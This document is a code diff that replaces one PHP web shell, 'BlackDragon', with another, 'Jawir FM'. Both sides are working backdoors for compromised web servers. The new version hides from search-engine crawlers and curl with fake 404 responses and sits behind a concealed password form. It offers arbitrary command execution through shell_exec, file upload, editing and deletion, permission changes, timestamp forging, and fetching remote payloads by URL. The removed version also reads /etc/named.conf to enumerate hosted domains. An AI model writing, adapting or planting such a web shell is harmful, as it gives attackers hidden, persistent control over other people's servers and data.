@@ -1,605 +1,447 @@
-<?php null;
-
+<?php
 session_start();
-error_reporting(0);
-set_time_limit(0);
-@ini_set('error_log', 0);
-@ini_set('log_errors', 0);
-@ini_set('max_execution_time', 0);
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
+define('APP_VER', '0.3');
+$password = defined('PW') ? PW : '5c5fa09440696b310b4b1750d49f84ca';
 
-function flash($message, $status, $class, $redirect = false) {
-    if (!empty($_SESSION["message"])) {
-        unset($_SESSION["message"]);
+// Undetect bots
+if (!empty($_SERVER['HTTP_USER_AGENT'])) {
+    $bots = ['Googlebot', 'Slurp', 'MSNBot', 'PycURL', 'facebookexternalhit', 'ia_archiver', 'crawler', 'Yandex', 'Rambler', 'Yahoo! Slurp', 'YahooSeeker', 'bingbot', 'curl'];
+    if (preg_match('/' . implode('|', $bots) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+        header('HTTP/1.0 404 Not Found');
+        exit;
     }
-    if (!empty($_SESSION["class"])) {
-        unset($_SESSION["class"]);
-    }
-    if (!empty($_SESSION["status"])) {
-        unset($_SESSION["status"]);
-    }
-    $_SESSION["message"] = $message;
-    $_SESSION["class"] = $class;
-    $_SESSION["status"] = $status;
-    if ($redirect) {
-        header('Location: ' . $redirect);
-        exit();
-    }
-    return true;
 }
 
-function clear() {
-    if (!empty($_SESSION["message"])) {
-        unset($_SESSION["message"]);
+// Handle login actions
+if (!isset($_SESSION['logged_in'])) {
+    if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['password']) && md5($_POST['password'])==$password) {
+        $_SESSION['logged_in'] = true; header('Location:'); exit;
     }
-    if (!empty($_SESSION["class"])) {
-        unset($_SESSION["class"]);
-    }
-    if (!empty($_SESSION["status"])) {
-        unset($_SESSION["status"]);
-    }
-    return true;
+    echo '<!DOCTYPE html><html><body class="p-4"><form method="post"><input type="password" name="password" class="border px-2"> <button style="display:none">Login</button></form></body></html>'; exit;
 }
 
-function writable($path, $perms){
-    return (!is_writable($path)) ? "<font color=\"red\">".$perms."</font>" : "<font color=\"lime\">".$perms."</font>";
+// Path
+$action = isset($_GET['action']) ? $_GET['action'] : 'filemanager';
+$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
+if (!$path || !is_dir($path)) $path = getcwd();
+$parent = dirname($path);
+
+// Handle sort preference
+if(isset($_GET['sort'])) $_SESSION['sort']=$_GET['sort'];
+if(isset($_GET['order'])) $_SESSION['order']=$_GET['order'];
+$sort = isset($_SESSION['sort']) ? $_SESSION['sort'] : 'name';
+$order = isset($_SESSION['order']) ? $_SESSION['order'] : 'asc';
+
+// Handle search
+$search = isset($_GET['search']) ? $_GET['search'] : '';
+
+// Handle POST actions
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    try {
+        $self = basename(__FILE__);
+        if($action=='command' && isset($_POST['cmd'])){
+            $output = shell_exec($_POST['cmd'].' 2>&1');
+            echo '<pre class="bg-black text-green-400 p-2 rounded">'.$output.'</pre>';
+            exit;
+        }
+        elseif (isset($_POST['get_content'])) {
+            $f = basename($_POST['get_content']);
+            if ($f == $self) {
+                echo 'Author @willygoid';
+            } else {
+                $file = $path.'/'.$f;
+                if (is_file($file)) {
+                    echo file_get_contents($file);
+                } else {
+                    echo '';
+                }
+            }
+            exit;
+        }
+        elseif (isset($_POST['new_folder'])){
+            mkdir($path.'/'.basename($_POST['new_folder']));
+            $_SESSION['msg']='Folder created'; $_SESSION['msg_type']='success';
+        }
+        elseif (isset($_POST['new_file'])){
+            $new = basename($_POST['new_file']);
+            if($new==$self){
+                $_SESSION['msg']='Cannot overwrite file manager itself'; $_SESSION['msg_type']='error';
+            } else {
+                file_put_contents($path.'/'.$new, '');
+                $_SESSION['msg']='File created'; $_SESSION['msg_type']='success';
+            }
+        }
+        elseif (isset($_POST['delete'])){
+            $t=basename($_POST['delete']);
+            if($t==$self){
+                $_SESSION['msg']='Cannot delete file manager itself'; $_SESSION['msg_type']='error';
+            } else {
+                $target=$path.'/'.$t;
+                if(is_dir($target)?rmdir($target):unlink($target)){
+                    $_SESSION['msg']='Deleted successfully'; $_SESSION['msg_type']='success';
+                } else{ $_SESSION['msg']='Delete failed'; $_SESSION['msg_type']='error'; }
+            }
+        }
+        elseif (isset($_POST['rename_from'],$_POST['rename_to'])){
+            if(rename($path.'/'.basename($_POST['rename_from']),$path.'/'.basename($_POST['rename_to']))){
+                $_SESSION['msg']='Renamed successfully'; $_SESSION['msg_type']='success';
+            } else{ $_SESSION['msg']='Rename failed'; $_SESSION['msg_type']='error'; }
+        }
+        elseif (isset($_POST['edit_file'],$_POST['content'])){
+            $edit = basename($_POST['edit_file']);
+            if($edit==$self){
+                $_SESSION['msg']='Cannot edit file manager itself'; $_SESSION['msg_type']='error';
+            } else {
+                if(file_put_contents($path.'/'.$edit,$_POST['content'])!==false){
+                    $_SESSION['msg']='Saved successfully'; $_SESSION['msg_type']='success';
+                } else{ $_SESSION['msg']='Save failed'; $_SESSION['msg_type']='error'; }
+            }
+        }
+        elseif (isset($_FILES['files'])){
+            $ok=0;
+            foreach($_FILES['files']['tmp_name'] as $i=>$tmp)
+                if(move_uploaded_file($tmp,$path.'/'.basename($_FILES['files']['name'][$i]))) $ok++;
+            $_SESSION['msg']= $ok.' file(s) uploaded'; $_SESSION['msg_type']='success';
+        }
+        elseif (isset($_POST['update_perm']) && isset($_POST['perm_value'])) {
+            $file=$path.'/'.basename($_POST['update_perm']);
+            if(@chmod($file, octdec($_POST['perm_value']))){
+                $_SESSION['msg']='Permission updated'; $_SESSION['msg_type']='success';
+            } else{ $_SESSION['msg']='Update permission failed'; $_SESSION['msg_type']='error'; }
+        }
+        elseif (isset($_POST['update_mtime'],$_POST['mtime_value'])){
+            $file=$path.'/'.basename($_POST['update_mtime']);
+            if(@touch($file, strtotime($_POST['mtime_value']))){
+                $_SESSION['msg']='Modified time updated'; $_SESSION['msg_type']='success';
+            } else{ $_SESSION['msg']='Update failed'; $_SESSION['msg_type']='error'; }
+        }
+        elseif (isset($_POST['download_url'],$_POST['output_name'],$_POST['method'])){
+            $url=trim($_POST['download_url']); $out=$path.'/'.basename($_POST['output_name']); $method=$_POST['method'];
+            $ok=false;
+            switch($method){
+                case 'file_get_contents': $d=@file_get_contents($url); if($d!==false)$ok=file_put_contents($out,$d)!==false; break;
+                case 'copy': $ok=@copy($url,$out); break;
+                case 'fopen': $in=@fopen($url,'rb'); $outf=@fopen($out,'wb'); if($in&&$outf){while(!feof($in))fwrite($outf,fread($in,8192)); fclose($in); fclose($outf); $ok=true;} break;
+                case 'stream_context': $ctx=stream_context_create(); $d=@file_get_contents($url,false,$ctx); if($d!==false)$ok=file_put_contents($out,$d)!==false; break;
+                case 'curl': $ch=curl_init($url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $d=curl_exec($ch); curl_close($ch); if($d!==false)$ok=file_put_contents($out,$d)!==false; break;
+            }
+            $_SESSION['msg']= $ok?'Download success':'Download failed'; $_SESSION['msg_type']=$ok?'success':'error';
+        }
+    } catch(Exception $e){ $_SESSION['msg']='Error: '.$e->getMessage(); $_SESSION['msg_type']='error'; }
+    header('Location: '.$_SERVER['REQUEST_URI']); exit;
 }
 
-function perms($path) {
-    $perms = fileperms($path);
-    if (($perms & 0xC000) == 0xC000) {
-        $info = 's';
-    } elseif (($perms & 0xA000) == 0xA000) {
-        $info = 'l';
-    } elseif (($perms & 0x8000) == 0x8000) {
-        $info = '-';
-    } elseif (($perms & 0x6000) == 0x6000) {
-        $info = 'b';
-    } elseif (($perms & 0x4000) == 0x4000) {
-        $info = 'd';
-    } elseif (($perms & 0x2000) == 0x2000) {
-        $info = 'c';
-    } elseif (($perms & 0x1000) == 0x1000) {
-        $info = 'p';
-    } else {
-        $info = 'u';
-    }
-
-    $info .= (($perms & 0x0100) ? 'r' : '-');
-    $info .= (($perms & 0x0080) ? 'w' : '-');
-    $info .= (($perms & 0x0040) ?
-    (($perms & 0x0800) ? 's' : 'x' ) :
-    (($perms & 0x0800) ? 'S' : '-'));
-
-    $info .= (($perms & 0x0020) ? 'r' : '-');
-    $info .= (($perms & 0x0010) ? 'w' : '-');
-    $info .= (($perms & 0x0008) ?
-    (($perms & 0x0400) ? 's' : 'x' ) :
-    (($perms & 0x0400) ? 'S' : '-'));
-    
-    $info .= (($perms & 0x0004) ? 'r' : '-');
-    $info .= (($perms & 0x0002) ? 'w' : '-');
-    $info .= (($perms & 0x0001) ?
-    (($perms & 0x0200) ? 't' : 'x' ) :
-    (($perms & 0x0200) ? 'T' : '-'));
-
-    return $info;
+// Scan dir
+$files=scandir($path);
+$folders=[];$regular_files=[];
+foreach($files as $f){
+    if($f=='.'||$f=='..')continue;
+    $fp=$path.'/'.$f;
+    $stat = stat($fp);
+    if($search && stripos($f,$search)===false) continue;
+    $u = posix_getpwuid($stat['uid']); $owner = $u ? $u['name'] : '?';
+    $g = posix_getgrgid($stat['gid']); $group = $g ? $g['name'] : '?';
+    $perm= substr(sprintf('%o', $stat['mode']), -3);
+    $item=['name'=>$f,'mtime'=>$stat['mtime'],'owner'=>$owner.':'.$group,'perm'=>$perm];
+    if(is_dir($fp)) $folders[]=$item; else $regular_files[]=$item;
 }
 
-function fsize($file) {
-    $a = ["B", "KB", "MB", "GB", "TB", "PB"];
-    $pos = 0;
-    $size = filesize($file);
-    while ($size >= 1024) {
-        $size /= 1024;
-        $pos++;
-    }
-    return round($size, 2)." ".$a[$pos];
-}
-
-if (isset($_GET['dir'])) {
-    $path = $_GET['dir'];
-    chdir($_GET['dir']);
-} else {
-    $path = getcwd();
-}
-
-$path = str_replace('\\', '/', $path);
-$exdir = explode('/', $path);
-
-function getOwner($item) {
-    if (function_exists("posix_getpwuid")) {
-        $downer = @posix_getpwuid(fileowner($item));
-        $downer = $downer['name'];
-    } else {
-        $downer = fileowner($item);
-    }
-    if (function_exists("posix_getgrgid")) {
-        $dgrp = @posix_getgrgid(filegroup($item));
-        $dgrp = $dgrp['name'];
-    } else {
-        $dgrp = filegroup($item);
-    }
-    return $downer . '/' . $dgrp;
-}
-
-if (isset($_POST['newFolderName'])) {
-    if (mkdir($path . '/' . $_POST['newFolderName'])) {
-        flash("Create Folder Successfully!", "Success", "success", "?dir=$path");
-    } else {
-        flash("Create Folder Failed", "Failed", "error", "?dir=$path");
-    }
-}
-if (isset($_POST['newFileName']) && isset($_POST['newFileContent'])) {
-    if (file_put_contents($_POST['newFileName'], $_POST['newFileContent'])) {
-        flash("Create File Successfully!", "Success", "success", "?dir=$path");
-    } else {
-        flash("Create File Failed", "Failed", "error", "?dir=$path");
-    }
-}
-if (isset($_POST['newName']) && isset($_GET['item'])) {
-    if ($_POST['newName'] == '') {
-        flash("You miss an important value", "Ooopss..", "warning", "?dir=$path");
-    }
-    if (rename($path. '/'. $_GET['item'], $_POST['newName'])) {
-        flash("Rename Successfully!", "Success", "success", "?dir=$path");
-    } else {
-        flash("Rename Failed", "Failed", "error", "?dir=$path");
-    }
-}
-if (isset($_POST['newContent']) && isset($_GET['item'])) {
-    if (file_put_contents($path. '/'. $_GET['item'], $_POST['newContent'])) {
-        flash("Edit Successfully!", "Success", "success", "?dir=$path");
-    } else {
-        flash("Edit Failed", "Failed", "error", "?dir=$path");
-    }
-}
-if (isset($_POST['newPerm']) && isset($_GET['item'])) {
-    if ($_POST['newPerm'] == '') {
-        flash("You miss an important value", "Ooopss..", "warning", "?dir=$path");
-    }
-    if (chmod($path. '/'. $_GET['item'], $_POST['newPerm'])) {
-        flash("Change Permission Successfully!", "Success", "success", "?dir=$path");
-    } else {
-        flash("Change Permission", "Failed", "error", "?dir=$path");
-    }
-}
-if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['item'])) {
-    if (is_dir($_GET['item'])) {
-        if (rmdir($_GET['item'])) {
-            flash("Delete Successfully!", "Success", "success", "?dir=$path");
+// Sort
+$sort_func = function($a, $b) use ($sort, $order) {
+    if ($sort == 'mtime') {
+        if ($order == 'asc') {
+            return ($a['mtime'] == $b['mtime']) ? 0 : (($a['mtime'] < $b['mtime']) ? -1 : 1);
         } else {
-            flash("Delete Failed", "Failed", "error", "?dir=$path");
+            return ($a['mtime'] == $b['mtime']) ? 0 : (($a['mtime'] > $b['mtime']) ? -1 : 1);
         }
     } else {
-        if (unlink($_GET['item'])) {
-            flash("Delete Successfully!", "Success", "success", "?dir=$path");
-        } else {
-            flash("Delete Failed", "Failed", "error", "?dir=$path");
-        }
+        return ($order == 'asc') ? strcasecmp($a['name'], $b['name']) : strcasecmp($b['name'], $a['name']);
     }
+};
+usort($folders,$sort_func); usort($regular_files,$sort_func);
+
+// URL builder
+function toggle_order($c){return $c=='asc'?'desc':'asc';}
+function sort_url($by,$cs,$co,$p,$s){$o=($by==$cs)?toggle_order($co):'asc'; return "?path=".urlencode($p)."&sort=$by&order=$o&search=".urlencode($s);}
+
+//Breadcrumbs
+$parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
+$breadcrumbs = [];
+$build = DIRECTORY_SEPARATOR;
+foreach ($parts as $part) {
+    if ($part === '') continue;
+    $build .= $part . DIRECTORY_SEPARATOR;
+    $breadcrumbs[] = ['name'=>$part, 'path'=>$build];
 }
 
-if ($_POST['submit']) {
-    if ($_POST['upl'] == 'current') {
-        $total = count($_FILES['uploadfile']['name']);
-        for ($i = 0; $i < $total; $i++) {
-            $mainupload = move_uploaded_file($_FILES['uploadfile']['tmp_name'][$i], $_FILES['uploadfile']['name'][$i]);
-        }
-        if ($total < 2) {
-            if ($mainupload) {
-                flash("Upload File Successfully! ", "Success", "success", "?dir=$path");
-            } else {
-                flash("Upload Failed", "Failed", "error", "?dir=$path");
-            }
-        } else {
-            if ($mainupload) {
-                flash("Upload $i Files Successfully! ", "Success", "success", "?dir=$path");
-            } else {
-                flash("Upload Failed", "Failed", "error", "?dir=$path");
-            }
-        }
-    } elseif ($_POST['upl'] == 'root') {
-        $total = count($_FILES['uploadfile']['name']);
-        for ($i = 0; $i < $total; $i++) {
-            $mainupload = move_uploaded_file($_FILES['uploadfile']['tmp_name'][$i], $_SERVER['DOCUMENT_ROOT']."/".$_FILES['uploadfile']['name'][$i]);
-        }
-        if ($total < 2) {
-            if ($mainupload) {
-                flash("Upload File Successfully! ", "Success", "success", "?dir=$path");
-            } else {
-                flash("Upload Failed", "Failed", "error", "?dir=$path");
-            }
-        } else {
-            if ($mainupload) {
-                flash("Upload $i Files Successfully! ", "Success", "success", "?dir=$path");
-            } else {
-                flash("Upload Failed", "Failed", "error", "?dir=$path");
-            }
-        }
-    }
+// Goto Dir
+$self_dir = dirname(realpath(__FILE__));
+$docroot = realpath($_SERVER['DOCUMENT_ROOT']);
+
+//Server info
+function getServerInfo(){
+    return [
+        'OS' => php_uname(),
+        'PHP Version' => PHP_VERSION,
+        'Server Software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'CLI',
+        'Disabled Functions' => ini_get('disable_functions'),
+        'Loaded Extensions' => implode(', ', get_loaded_extensions()),
+    ];
 }
-
-// Upload from URL
-if (isset($_POST['url']) && isset($_POST['filename']) && isset($_POST['method'])) {
-    $url = $_POST['url'];
-    $filename = $_POST['filename'];
-    $destination = $path . '/' . $filename;
-
-    switch ($_POST['method']) {
-        case 'file_get_contents':
-            $data = file_get_contents($url);
-            if ($data !== false) {
-                file_put_contents($destination, $data);
-                flash("File uploaded successfully using file_get_contents!", "Success", "success", "?dir=$path");
-            } else {
-                flash("Failed to upload file using file_get_contents", "Failed", "error", "?dir=$path");
-            }
-            break;
-
-        case 'curl':
-            $ch = curl_init($url);
-            $fp = fopen($destination, 'wb');
-            curl_setopt($ch, CURLOPT_FILE, $fp);
-            curl_setopt($ch, CURLOPT_HEADER, 0);
-            curl_exec($ch);
-            if (curl_errno($ch)) {
-                flash("Failed to upload file using cURL: " . curl_error($ch), "Failed", "error", "?dir=$path");
-            } else {
-                flash("File uploaded successfully using cURL!", "Success", "success", "?dir=$path");
-            }
-            curl_close($ch);
-            fclose($fp);
-            break;
-
-        case 'fopen':
-            $stream = fopen($url, 'rb');
-            if ($stream) {
-                $contents = stream_get_contents($stream);
-                fclose($stream);
-                file_put_contents($destination, $contents);
-                flash("File uploaded successfully using fopen!", "Success", "success", "?dir=$path");
-            } else {
-                flash("Failed to upload file using fopen", "Failed", "error", "?dir=$path");
-            }
-            break;
-
-        case 'copy':
-            if (copy($url, $destination)) {
-                flash("File uploaded successfully using copy!", "Success", "success", "?dir=$path");
-            } else {
-                flash("Failed to upload file using copy", "Failed", "error", "?dir=$path");
-            }
-            break;
-
-        case 'stream_context':
-            $context = stream_context_create(['http' => ['method' => 'GET']]);
-            $data = file_get_contents($url, false, $context);
-            if ($data !== false) {
-                file_put_contents($destination, $data);
-                flash("File uploaded successfully using stream_context!", "Success", "success", "?dir=$path");
-            } else {
-                flash("Failed to upload file using stream_context", "Failed", "error", "?dir=$path");
-            }
-            break;
-    }
-}
-
-$dirs = scandir($path);
-
-$d0mains = @file("/etc/named.conf", false);
-if (!$d0mains){
-    $dom = "Cant read /etc/named.conf";
-    $GLOBALS["need_to_update_header"] = "true";
-} else { 
-    $count = 0;
-    foreach ($d0mains as $d0main){
-        if (@strstr($d0main, "zone")){
-            preg_match_all('#zone "(.*)"#', $d0main, $domains);
-            flush();
-            if (strlen(trim($domains[1][0])) > 2){
-                flush();
-                $count++;
-            }
-        }
-    }
-    $dom = "$count Domain";
-}
-
-$ip = !@$_SERVER['SERVER_ADDR'] ? gethostbyname($_SERVER['SERVER_NAME']) : @$_SERVER['SERVER_ADDR'];
-$serv = $_SERVER['HTTP_HOST']; 
-$soft = $_SERVER['SERVER_SOFTWARE'];
-$uname = php_uname();
-
 ?>
+<!DOCTYPE html>
 <html>
-    <head>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <meta name="robots" content="noindex, nofollow">
-        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
-        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
-        <title><?= $serv; ?> - BlackDragon</title>
-    </head>
-    <body class="bg-dark text-light">
-        <div class="container-fluid">
-            <div class="py-3" id="main">
-                <div class="box shadow bg-dark p-4 rounded-3">
-                    <div class="info mb-3">
-                        <i class="fa fa-server"></i>&ensp;<?= $uname; ?><br>
-                        <i class="fa fa-microchip"></i>&ensp;<?= $soft; ?><br>
-                        <i class="fa fa-satellite-dish"></i>&ensp;<?= $ip; ?><br>
-                        <i class="fa fa-fingerprint"></i>&ensp;<?= $dom; ?>
-                    </div>
-                    <div class="breadcrumb">
-                        <i class="fa fa fa-folder pt-1"></i>&ensp;<?php foreach ($exdir as $id => $pat) : if ($pat == '' && $id == 0):?>
-                        <a href="?dir=/" class="text-decoration-none text-light">/</a>
-                        <?php endif; if ($pat == '') continue; ?>
-                        <a href="?dir=<?php for ($i = 0; $i <= $id; $i++) {echo "$exdir[$i]";if ($i != $id) echo "/";}?>" class="text-decoration-none text-light"><?= $pat ?></a><span class="text-light"> /</span>
-                        <?php endforeach; ?>
-                        &nbsp; [&nbsp;<?php echo writable($path, perms($path)) ?>&nbsp;]
-                        <div class="row">
-                            <a href="?" class="text-decoration-none text-light">&nbsp; [&nbsp;HOME&nbsp;]</a>
-                        </div>
-                    </div>
-                    <div class="d-flex justify-content-between">
-                        <div class="p-2">
-                            <form action="" method="post">
-                                <label for="name" class="form-label">Console</label>
-                                <div class="row">
-                                    <div class="col-md-9 mb-3">
-                                        <input type="text" class="form-control form-control-sm" name="bdcmd" placeholder="whoami">
-                                    </div>
-                                    <div class="col-md-3">
-                                        <button type="submit" class="btn btn-outline-light btn-sm">Submit</button>
-                                    </div>
-                                </div>
-                            </form>
-                        </div>
-                        <div class="p-2">
-                            <form action="" method="post" enctype="multipart/form-data">
-                                <input class="form-check-input" type="radio" id="flexRadioDefault1" name="upl" value="current" checked>
-                                <label class="form-label">Current Dir&nbsp;</label>
-                                <input class="form-check-input" type="radio" id="flexRadioDefault2" name="upl" value="root">
-                                <label class="form-label">Root Dir</label>
-                                <div class="row">
-                                    <div class="col-md-9 mb-3">
-                                        <input type="file" class="form-control form-control-sm" name="uploadfile[]" multiple id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload">
-                                    </div>
-                                    <div class="col-md-3">
-                                        <input type='submit' class="btn btn-outline-light btn-sm" value='Submit' name='submit'>
-                                    </div>
-                                </div>
-                            </form>
-                        </div>
-                    </div>
-                    <div class="container" id="tools">
-                        <div class="collapse" id="uploadUrlCollapse" data-bs-parent="#tools" style="transition:none;">
-                            <form action="" method="post">
-                                <div class="mb-3">
-                                    <label for="url" class="form-label">URL to Upload</label>
-                                    <input type="text" class="form-control" name="url" placeholder="Enter URL here" required>
-                                </div>
-                                <div class="mb-3">
-                                    <label for="filename" class="form-label">File Name</label>
-                                    <input type="text" class="form-control" name="filename" placeholder="Enter file name" required>
-                                </div>
-                                <div class="mb-3">
-                                    <label for="method" class="form-label">Upload Method</label>
-                                    <select class="form-select" name="method" required>
-                                        <option value="file_get_contents">file_get_contents</option>
-                                        <option value="curl">cURL</option>
-                                        <option value="fopen">fopen</option>
-                                        <option value="copy">copy</option>
-                                        <option value="stream_context">stream_context</option>
-                                    </select>
-                                </div>
-                                <button type="submit" class="btn btn-outline-light">Upload</button>
-                            </form>
-                        </div>
-                        <a data-bs-toggle="collapse" href="#uploadUrlCollapse" role="button" aria-expanded="false" aria-controls="uploadUrlCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-link"></i> Upload from URL</a>
+<head>
+<meta charset="UTF-8">
+<title>File Manager Pro</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+<style>
+body.dark table { background-color: #1f2937; color: #f3f4f6; }
+body.dark table tr { border-color: #374151; }
+body.dark .bg-gray-200 { background-color: #374151 !important; }
+body.dark .bg-white { background-color: #1f2937 !important; color: #f3f4f6; }
+body.dark input, body.dark textarea, body.dark select {background-color: #374151 !important; color: #f3f4f6;}
+body.dark .border { border-color: #4b5563 !important; }
+body.dark .text-gray-700 { color: #d1d5db !important; }
+body.dark .text-gray-500 { color: #9ca3af !important; }
+body.dark .bg-gray-50 { background-color: #374151 !important; }
+body.dark .bg-gray-300 {background-color: #4b5563 !important; color: #f9fafb !important;}
+body.dark .bg-gray-200 {background-color: #4b5563 !important; color: #f9fafb !important;}
+</style>
+<script>
+$(function(){
+    $('.edit-btn').click(function(){ let f=$(this).data('file'); $('.edit-filename').text(f); $.post('',{get_content:f},d=>{$('#editModal textarea').val(d);$('#editModal input[name="edit_file"]').val(f);$('#editModal').removeClass('hidden');});});
+    $('.delete-btn').click(function(){ $('#deleteModal input[name="delete"]').val($(this).data('file')); $('#deleteModal span').text($(this).data('file')); $('#deleteModal').removeClass('hidden');});
+    $('.rename-btn').click(function(){ $('#renameModal input[name="rename_from"]').val($(this).data('file')); $('#renameModal input[name="rename_to"]').val($(this).data('file')); $('#renameModal').removeClass('hidden');});
+    $('.perm-btn').click(function(){ let f=$(this).data('file'); let p=$(this).data('perm'); $('#permModal input[name="update_perm"]').val(f); $('#permModal input[name="perm_value"]').val(p); $('#permModal span').text(f); $('#permModal').removeClass('hidden'); });
+    $('.mtime-btn').click(function(){ let f=$(this).data('file'); let dt=$(this).data('mtime'); $('#mtimeModal input[name="update_mtime"]').val(f); $('#mtimeModal input[name="mtime_value"]').val(dt); $('#mtimeModal span').text(f); $('#mtimeModal').removeClass('hidden');});
+    $('#showNewFile').click(()=>$('#newFileModal').removeClass('hidden'));
+    $('#showNewFolder').click(()=>$('#newFolderModal').removeClass('hidden'));
+    $('#showDownloader').click(()=>$('#downloaderModal').removeClass('hidden'));
+    $('#uploadBtn').click(()=>$('#uploadInput').click());
+    $('.close').click(()=>$('.modal').addClass('hidden'));
+    $('#uploadInput').change(()=>$('#uploadForm').submit());
+});
+</script>
+<script>
+$(function(){
+    $('.menu-btn').click(function(){
+        let act=$(this).data('action');
+        $('.menu-btn').removeClass('bg-blue-500 text-white').addClass('bg-gray-200 text-gray-800');
+        $(this).addClass('bg-blue-500 text-white');
+        $('#content').html('<div class="text-center p-4">Loading...</div>');
+        $.get('?action='+act,function(d){ $('#content').html(d); });
+    });
+    // on load, highlight active
+    $('.menu-btn[data-action="<?=$action?>"]').addClass('bg-blue-500 text-white').removeClass('bg-gray-200 text-gray-800');
+});
+</script>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
+</head>
+<body id="content" class="bg-gray-100">
+<header class="container mx-auto flex items-center justify-between p-4">
+    <a href="?path=<?=urlencode($self_dir)?>" class="flex items-center">
+        <h1 class="text-xl sm:text-2xl lg:text-3xl font-bold">Jawir FM</h1>
+    </a>
+    <a href="?path=<?=urlencode($docroot)?>" class="flex items-center">
+        <img alt="Logo App" class="h-8 md:h-12" src="//sga-cdn-hxg6b2d7ctb2c0eu.z02.azurefd.net/agent-websites/319/medialibrary/images/319_756a1e4ed5294e85a8c61f1031637228.webp"/>
+    </a>
+</header>
+<div class="container mx-auto flex space-x-2 mb-4">
+    <button data-action="filemanager" class="menu-btn bg-gray-200 text-gray-800 px-3 py-1 rounded">📁 File Manager</button>
+    <button data-action="serverinfo" class="menu-btn bg-gray-200 text-gray-800 px-3 py-1 rounded">💻 Server Info</button>
+    <button data-action="command" class="menu-btn bg-gray-200 text-gray-800 px-3 py-1 rounded">💡 Command</button>
+</div>
+<main role="main" class="container mx-auto mb-4">
+<nav class="flex px-5 py-3 text-gray-700 border border-gray-200 rounded-lg bg-gray-50" aria-label="Breadcrumb">
+  <ol class="inline-flex items-center space-x-1 md:space-x-2 rtl:space-x-reverse">
+    <li class="inline-flex items-center">
+      <a href="?path=/" class="inline-flex items-center text-sm font-medium text-gray-700 hover:text-blue-600">
+        <svg xmlns="http://www.w3.org/2000/svg" class="w-3 h-3 me-2.5" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20">
+          <path d="m19.707 9.293-2-2-7-7a1 1 0 0 0-1.414 0l-7 7-2 2a1 1 0 0 0 1.414 1.414L2 10.414V18a2 2 0 0 0 2 2h3a1 1 0 0 0 1-1v-4a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1v4a1 1 0 0 0 1 1h3a2 2 0 0 0 2-2v-7.586l.293.293a1 1 0 0 0 1.414-1.414Z"/>
+        </svg>
+      </a>
+    </li>
+    <?php foreach($breadcrumbs as $i => $crumb): ?>
+    <li class="inline-flex items-center">
+      <svg xmlns="http://www.w3.org/2000/svg" class="rtl:rotate-180 block w-3 h-3 mx-1 text-gray-400 " aria-hidden="true" fill="none" viewBox="0 0 6 10">
+        <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 9 4-4-4-4"/>
+      </svg>
+      <?php if($i < count($breadcrumbs)-1): ?>
+      <a href="?path=<?=urlencode(rtrim($crumb['path'],'/'))?>" class="inline-flex items-center text-sm font-medium text-gray-700 hover:text-blue-600">
+        <?=htmlspecialchars($crumb['name'])?>
+      </a>
+      <?php else: ?>
+      <span class="ms-1 text-sm font-medium <?=is_writable($crumb['path'])?'text-green-500':'text-red-500'?> md:ms-2"><?=htmlspecialchars($crumb['name'])?></span>
+      <?php endif;?>
+    </li>
+    <?php endforeach; ?>
+  </ol>
+</nav>
+</main>
+<?php
+if($action=='serverinfo'):
+    $info=getServerInfo(); ?>
+    <div class="container mx-auto p-4 bg-white rounded-lg shadow">
+    <h2 class="text-xl font-bold mb-2">💻 Server Info</h2>
+    <ul class="list-disc pl-5">
+    <?php foreach($info as $k=>$v): ?>
+    <li><span class="font-semibold"><?=htmlspecialchars($k)?>:</span> <span class="text-gray-700"><?=htmlspecialchars($v)?></span></li>
+    <?php endforeach; ?>
+    </ul>
+    </div>
 
-                        <?php if (isset($_POST['bdcmd'])) : ?>
-                            <div class="p-2">
-                                <div class="row justify-content-center">
-                                    <div class='card text-dark mb-3'>
-                                        <pre><?php echo $ip."@".$serv.":&nbsp;~$&nbsp;"; $cmd = $_POST['bdcmd']; echo $cmd."<br>";?><br><code><?php if(function_exists('shell_exec')){ echo shell_exec($cmd.' 2>&1'); } else { echo "Disable Function"; }?></code></pre>
-                                    </div>
-                                </div>
-                            </div>
-                        <?php endif; ?>
-                        <?php if (isset($_GET['action']) && $_GET['action'] != 'delete') : $action = $_GET['action'] ?>
-                            <div class="row justify-content-center">
-                                <?php if ($action == 'rename' && isset($_GET['item'])) : ?>
-                                    <form action="" method="post">
-                                        <div class="mb-3">
-                                            <label for="name" class="form-label">New Name</label>
-                                            <input type="text" class="form-control" name="newName" value="<?= $_GET['item'] ?>">
-                                        </div>
-                                        <button type="submit" class="btn btn-outline-light">Submit</button>
-                                        <button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
-                                    </form>
-                                <?php elseif ($action == 'edit' && isset($_GET['item'])) : ?>
-                                    <form action="" method="post">
-                                        <div class="mb-3">
